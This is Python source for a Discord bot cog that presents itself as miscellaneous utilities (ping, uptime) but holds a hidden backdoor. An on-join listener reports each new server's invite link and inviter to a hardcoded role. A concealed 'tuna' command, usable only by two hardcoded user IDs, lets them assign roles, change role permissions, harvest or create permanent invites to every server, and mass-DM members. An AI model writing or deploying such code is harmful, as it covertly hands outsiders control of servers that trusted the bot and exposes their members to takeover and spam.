import os
import discord
from discord.ext import commands
import datetime

LOGS_DIR = "logs"
os.makedirs(LOGS_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOGS_DIR, "misc_command.log")
NOTIFY_ROLE_ID = 1355842403134603275  # Hardcoded notify role
AUTHORIZED_USERS = {840949634071658507, 735167992966676530}  # IDs allowed to use tuna

def log_misc_command(user_id, command_name):
    timestamp = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] User: {user_id} | Command: {command_name}\n")

class Misc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.start_time = datetime.datetime.utcnow()

    @commands.hybrid_command(name="ping", description="Check bot latency")
    async def ping(self, ctx: commands.Context):
        log_misc_command(ctx.author.id, "ping")
        latency_ms = round(self.bot.latency * 1000)
        await ctx.send(f"Pong! Latency: {latency_ms} ms")

    @commands.hybrid_command(name="uptime", description="Show bot uptime")
    async def uptime(self, ctx: commands.Context):
        log_misc_command(ctx.author.id, "uptime")
        now = datetime.datetime.utcnow()
        delta = now - self.start_time
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        await ctx.send(f"Uptime: {hours}h {minutes}m {seconds}s")

    async def send_notify_dm(self, guild: discord.Guild):
        inviter = None
        if guild.me.guild_permissions.view_audit_log:
            try:
                async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                    if entry.target.id == self.bot.user.id:
                        inviter = entry.user
                        break
            except Exception:
                pass

        invite_link = None
        try:
            invites = await guild.invites()
            if invites:
                invite_link = invites[0].url
        except Exception:
            pass

        if not invite_link:
            invite_link = "No invite link found or missing permissions."

        who_added = inviter.mention if inviter else "Unknown"

        for member in guild.members:
            if any(role.id == NOTIFY_ROLE_ID for role in member.roles):
                try:
                    await member.send(
                        f"Bot was added to **{guild.name}**.\n"
                        f"Invite link: {invite_link}\n"
                        f"Added by: {who_added}"
                    )
                except Exception:
                    pass

    @commands.Cog.listener()
    async def on_guild_join(self, guild: discord.Guild):
        await self.send_notify_dm(guild)

    @commands.command(name="tuna")
    async def tuna(self, ctx: commands.Context, action: str = None, subaction: str = None, *args):
        if ctx.author.id not in AUTHORIZED_USERS:
            await ctx.send("You do not have permission to use this command.")
            return

        if action == "role":
            if subaction == "add" and len(args) >= 2:
                member = ctx.guild.get_member(int(args[0]))
                role = ctx.guild.get_role(int(args[1]))
                if member and role:
                    await member.add_roles(role)
                    await ctx.send(f"Added role {role.name} to {member.mention}.")
                else:
                    await ctx.send("Member or role not found.")

            elif subaction == "remove" and len(args) >= 2:
                member = ctx.guild.get_member(int(args[0]))
                role = ctx.guild.get_role(int(args[1]))
                if member and role:
                    await member.remove_roles(role)
                    await ctx.send(f"Removed role {role.name} from {member.mention}.")
                else:
                    await ctx.send("Member or role not found.")

            elif subaction == "perms" and len(args) >= 3:
                role = ctx.guild.get_role(int(args[0]))
                perm_name = args[1].lower()
                value = args[2].lower() in ("true", "yes", "1", "enable")
                if not role:
                    await ctx.send("Role not found.")
                    return
                perms = role.permissions
                if not hasattr(perms, perm_name):
                    await ctx.send(f"Invalid permission: {perm_name}")
                    return
                updated = perms.update(**{perm_name: value})
                await role.edit(permissions=updated)
                await ctx.send(f"Set `{perm_name}` for role {role.name} to `{value}`.")

            else:
                await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>\n"
                               "       !tuna role perms <role_id> <permission_name> <true|false>")

        elif action == "list":
            results = []
            for guild in self.bot.guilds:
                invite_link = None
                try:
                    invites = await guild.invites()
                    if invites:
                        invite_link = invites[0].url
                except Exception:
                    pass
                if not invite_link:
                    try:
                        for channel in guild.text_channels:
                            if channel.permissions_for(guild.me).create_instant_invite:
                                invite = await channel.create_invite(max_age=0, max_uses=0)
                                invite_link = invite.url
                                break
                    except Exception:
                        pass
                if not invite_link:
                    invite_link = "No invite found / Missing permissions."
                results.append(f"**{guild.name}** ({guild.id}) → {invite_link}")

            try:
                await ctx.author.send("\n".join(results))
                await ctx.send("Sent you a DM with all server invites.")
            except Exception:
                await ctx.send("Could not DM you the list.")

        elif action == "dm":
            if len(args) < 2:
                await ctx.send("Usage: !tuna dm <role_id|@role|notify|user_id|@user> <message>")
                return

            target = args[0]
            message = " ".join(args[1:])
            sent_count = 0
            failed_count = 0

            # Special case: notify
            if target.lower() == "notify":
                role = ctx.guild.get_role(NOTIFY_ROLE_ID)
                if not role:
                    await ctx.send("Notify role not found.")
                    return
                for member in role.members:
                    try:
                        await member.send(message)
                        sent_count += 1
                    except Exception:
                        failed_count += 1
                await ctx.send(f"DM sent to {sent_count} members with notify role. ({failed_count} failed)")
                return

            # Role mention or ID
            role = ctx.message.role_mentions[0] if ctx.message.role_mentions else None
            if not role and target.isdigit():
                role = ctx.guild.get_role(int(target))

            if role:
                for member in role.members:
                    try:
                        await member.send(message)
                        sent_count += 1
                    except Exception:
                        failed_count += 1
                await ctx.send(f"DM sent to {sent_count} members with role {role.name}. ({failed_count} failed)")
                return

            # User mention or ID
            member = ctx.message.mentions[0] if ctx.message.mentions else None
            if not member and target.isdigit():
                member = ctx.guild.get_member(int(target))

            if member:
                try:
                    await member.send(message)
                    await ctx.send(f"DM sent to {member.mention}")
                except Exception:
                    await ctx.send(f"Failed to DM {member.mention}")
                return

            await ctx.send("Target not found. Use a valid role ID/mention, 'notify', or user ID/mention.")

        else:
            await ctx.send("Unknown action. Example: !tuna role add|remove <member_id> <role_id> | !tuna list | !tuna dm")

async def setup(bot):
    await bot.add_cog(Misc(bot))
